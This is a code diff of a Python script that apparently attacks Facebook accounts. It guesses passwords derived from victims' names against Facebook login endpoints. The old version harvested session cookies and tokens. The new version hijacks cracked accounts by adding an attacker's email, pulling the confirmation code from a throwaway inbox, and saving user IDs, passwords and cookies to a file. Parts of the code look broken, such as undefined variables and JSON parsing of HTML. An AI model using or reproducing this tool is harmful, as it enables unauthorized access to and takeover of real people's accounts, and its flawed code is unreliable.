@@ -143,8 +143,6 @@ def __UBI___():
     return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9])
 
 def __Fire__(ids,names,passlist):
-    global loop,oks,cps
-    #r = requests.Session()
     sys.stdout.write(f'\r\r{rad}[{green}FINDING{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
     try:
         first = names.split(' ')[0]
@@ -158,62 +156,136 @@ def __Fire__(ids,names,passlist):
             pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
             adid = str(uuid.uuid4())
             data={
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
             'email': ids,
-            'password': pas,
-            'generate_analytics_claims': '1',
-            'community_id': '',
-            'cpl': 'true',
-            'try_num': '1',
-            'family_device_id': str(uuid.uuid4()),
-            'credentials_type': 'password',
-            'source': 'login',
-            'error_detail_type': 'button_with_disabled',
-            'enroll_misauth': 'false',
-            'generate_session_cookies': '1',
-            'generate_machine_id': '1',
-            'currently_logged_in_userid': '0',
+            'cuid': '',
+            'guid': 'f7d923be260ada3ea',
+            'lgnjs': '1733767601',
+            'lgnrnd': '100640_NiY9',
             'locale': 'en_GB',
-            'client_country_code': 'GB',
-            'fb_api_req_friendly_name': 'authenticate'}
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/gfgd',
+            'skstamp': '',
+            'timezone': '-330',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPf^%^2FfPAPPBFAC',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
             head={
-            'User-Agent': __UBI___(),
-            'Accept-Encoding':  'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Friendly-Name': 'authenticate',
-            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
-            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-HTTP-Engine': 'Liger'}
-            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
-            if 'access_token' in po:
-                coki = po["session_cookies"]
-                cok = {}
-                for x in coki:
-                    cok.update({x["name"]:x["value"]})
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
-                ids = re.findall('c_user=(.*);xs', kuki)[0]
-                print(f'\r\r\033[1;37m┌─\033[1;31m[\033[1;32mSUCCESSFUL\033[1;31m]                      ')
-                print(f'\r\r\033[1;37m├─\033[1;31m[\033[1;32mUSER\033[1;31m] - \033[1;32m{ids}                 ')
-                print(f'\r\r\033[1;37m├─\033[1;31m[\033[1;32mPASS\033[1;31m] - \033[1;32m{pas}                ')
-                print(f'\r\r\033[1;37m├─────────────────────────────────>   ')
-                print(f'\r\r\033[1;37m└─\033[1;31m[💚]─> \x1b[38;5;214m{kuki}    ')
-                open('/sdcard/OK.txt','a').write(ids+'|'+pas+'\n')
-                oks.append(ids)
-                break
-            else:
-                continue
-        loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(10)
+            'Origin': 'https://web.facebook.com',
+            'DNT': '1',
+            'Alt-Used': 'web.facebook.com',
+            'Connection': 'keep-alive',
+            'Referer': 'https://web.facebook.com/gfgd',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
+            response=requests.post('https://web.facebook.com/login/device-based/regular/login/?login_attempt=1',data=data,headers=head,allow_redirects=False).json()
+            response=requests.get("https://mbasic.facebook.com")
+            if "checkpoint" in response.text:
+                return "chk"
+            headers = {
+            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '21',
+            'upgrade-insecure-requests': '1',
+            'user-agent': random_ua()}
+            for i in  re.findall('href="/changeemail(.*?)"',response.text):
+                url="/changeemail"+i
+            response = requests.get("https://mbasic.facebook.com"+url, headers=headers)
+            headers = {
+            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '21',
+            'upgrade-insecure-requests': '1',
+            'user-agent': random_ua()}
+            data = {
+            'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(response.text)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"',str(response.text)).group(1),
+            'old_email': re.search('name="old_email" value="(.*?)"',str(response.text)).group(1),
+            'reg_instance': re.search('name="reg_instance" value="(.*?)"',str(response.text)).group(1),
+            'new': em,
+            'next': '',
+            'submit': 'Add'}
+            url = "https://m.facebook.com"+re.findall('action="(.*?)"',response.text)[0]
+            submit = requests.post(url, headers=headers, data=data)
+            r=requests.get("https://mbasic.facebook.com")
+            while True:
+               h=Email(mmail["session"]).inbox()
+               if h:
+                   j = h['topic'].split('-')[1];hh = j.split(' ')[0]
+                   cd = hh
+                   break
+            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not;A-Brand";v="99","Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not;A-Brand";v="99.0.0.0","Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': 'Android',
+            'sec-ch-ua-platform-version': '11.0.0',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': random_ua()}
+            data = {'contact': em,
+            'type': 'submit',
+            'is_soft_cliff': False,
+            'medium': 'email',
+            'code': cd,
+            'fb_dtsg': find(r.text,"fb_dtsg"),
+            'jazoest': find(r.text,"jazoest"),
+            '__user': dict(requests.cookies)['c_user']}
+            url = 'https://m.facebook.com/confirmation_cliff/'
+            response = requests.post(url, headers=headers, data=data)
+            dc=dict(requests.cookies)
+            cok=";".join([k+"="+v for k,v in dc.items()])
+            uid=re.findall("c_user=(.*?);",cok)[0]
+            coki = cvt('ok',requests.cookies.get_dict())+"dpr=2;locale=en_US;wd=950x1835;m_page_voice="+uid
+            print("\r\r\033[1;32m [OK] "+uid+'|'+pas+'|'+coki)
+            ok+=1
+            open(file,"a").write(uid+"|"+pas+"|"+coki+"\n")
+            linex()
     except Exception as e:
-        pass
+     if not "urllib" and not "perma" in str(e):print(e)
+     pass
 
 def __Firue__(ids,names,passlist):
     try:
